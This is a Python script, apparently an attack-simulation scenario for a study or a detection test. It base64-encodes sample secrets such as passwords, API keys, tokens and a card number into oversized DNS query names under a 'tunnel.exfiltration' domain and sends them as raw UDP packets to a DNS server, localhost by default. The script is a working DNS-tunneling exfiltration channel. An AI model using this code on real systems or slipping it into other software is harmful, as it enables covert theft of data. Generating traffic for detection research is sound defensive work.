import base64
import socket
import sys
import time


def build_dns_query_packet(domain: str) -> bytes:
    query = bytearray(b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00")
    for part in domain.split("."):
        encoded = part.encode("ascii")
        query.append(len(encoded))
        query.extend(encoded)
    query.append(0)
    query.extend(b"\x00\x01\x00\x01")  # Type A, Class IN
    return bytes(query)


def run_dns_tunneling(dns_server: str = "127.0.0.1", count: int = 6, interval: float = 0.2):
    """Table II Scenario 5: DNS Tunneling with oversized query domain names (> 50 B)."""
    print(f"\n[*] [ATTACK 5] Starting DNS Data Exfiltration / Tunneling ({count} queries, DNS name > 50 B)...")
    stolen_chunks = [
        "passwd:root:x:0:0:root:/root:/bin/bash",
        "api_key:sk-live-99a8b7c6d5e4f3a2b1c0",
        "db_pass:SuperSecretCorporateProdDatabase2026",
        "credit_card:4111222233334444:exp:12/28",
        "private_token:ghp_abcdefghijklmnopqrstuvwxyz123456",
        "internal_ip_map:10.0.0.1,10.0.0.2,10.0.0.5",
    ]

    sent_domains = []
    for i in range(count):
        secret = stolen_chunks[i % len(stolen_chunks)]
        encoded = base64.b64encode(secret.encode()).decode().replace("=", "")
        fake_domain = f"{encoded[:35]}.tunnel.exfiltration.threat.internal"
        assert len(fake_domain) > 50, f"Domain must exceed 50 bytes, got {len(fake_domain)}"
        print(f"    [DNS EXFIL {i + 1}/{count}] ({len(fake_domain)} B) -> {fake_domain}")
        pkt = build_dns_query_packet(fake_domain)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(0.5)
            sock.sendto(pkt, (dns_server, 53))
            sock.close()
            sent_domains.append(fake_domain)
        except Exception:
            pass
        if interval > 0:
            time.sleep(interval)

    print("[+] DNS tunneling simulation complete.\n")
    return sent_domains


if __name__ == "__main__":
    server = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    run_dns_tunneling(server)
